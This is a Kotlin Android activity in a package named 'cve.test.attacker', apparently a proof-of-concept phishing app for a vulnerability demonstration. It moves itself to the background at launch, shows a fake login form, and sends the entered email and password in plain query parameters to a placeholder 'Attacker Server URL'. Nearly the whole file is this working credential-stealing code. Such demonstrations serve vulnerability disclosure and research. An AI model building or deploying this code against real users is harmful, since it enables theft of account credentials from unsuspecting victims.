package cve.test.attacker

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.enableEdgeToEdge
import okhttp3.Call
import okhttp3.Callback
import okhttp3.HttpUrl
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException


class MainActivity : ComponentActivity() {

    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        moveTaskToBack(true)

        val emailText = findViewById<EditText>(R.id.emailEditText)
        val passwordText = findViewById<EditText>(R.id.passwordEditText)
        val loginButton = findViewById<Button>(R.id.loginButton)
        val forgotPasswordButton = findViewById<TextView>(R.id.forgotPasswordTextView)
        val forgotIdButton = findViewById<TextView>(R.id.forgotIdTextView)

        loginButton.setOnClickListener {
            val email = emailText.text.toString()
            val password = passwordText.text.toString()

            if (email.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Please fill in both fields", Toast.LENGTH_SHORT).show()
            } else {
                sendGetRequest(email, password)
            }
        }

        forgotPasswordButton.setOnClickListener {
            Toast.makeText(this, "Forgot Password \"admin\"", Toast.LENGTH_SHORT).show()
        }

        forgotIdButton.setOnClickListener {
            Toast.makeText(this, "Forgot ID \"admin@email.com\"", Toast.LENGTH_SHORT).show()
        }
    }

    private fun sendGetRequest(email: String, password: String) {
        val attackerUrl = HttpUrl.Builder()
            .scheme("https")
            .host("Attacker Server URL")
            .addPathSegment("User")
            .addQueryParameter("email", email)
            .addQueryParameter("password", password)
            .build()

        val request = Request.Builder()
            .url(attackerUrl)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Request Failed: Check Network Connection!", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val responseCode = response.code

                if (response.isSuccessful) {
                    runOnUiThread {
                        Toast.makeText(this@MainActivity, "Send Success!, Response Http Code: ${responseCode}", Toast.LENGTH_LONG).show()
                    }
                } else {
                    runOnUiThread {
                        Toast.makeText(this@MainActivity, "Send Fail!, Response Http Code: ${responseCode}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }
}
